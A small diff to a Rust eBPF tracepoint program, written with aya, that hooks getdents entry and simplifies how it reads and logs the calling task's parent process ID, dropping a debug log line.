@@ -1,6 +1,5 @@
 #![no_std]
 #![no_main]
-
 use aya_ebpf::{
     helpers::{bpf_get_current_pid_tgid, bpf_get_current_task, bpf_probe_read_kernel},
     macros::{map, tracepoint},
@@ -35,15 +34,9 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
         let ppid = unsafe {
             let task = bpf_get_current_task() as *const task_struct;
 
-            let real_parent = bpf_probe_read_kernel::<task_struct>((*task).real_parent).unwrap();
-
-            info!(
-                &ctx,
-                "real_parent address: {:x}",
-                core::ptr::addr_of!(real_parent) as u64
-            );
-
-            real_parent.tgid
+            bpf_probe_read_kernel::<task_struct>((*task).real_parent)
+                .unwrap()
+                .tgid
         };
 
         info!(&ctx, "ppid is {}", ppid);
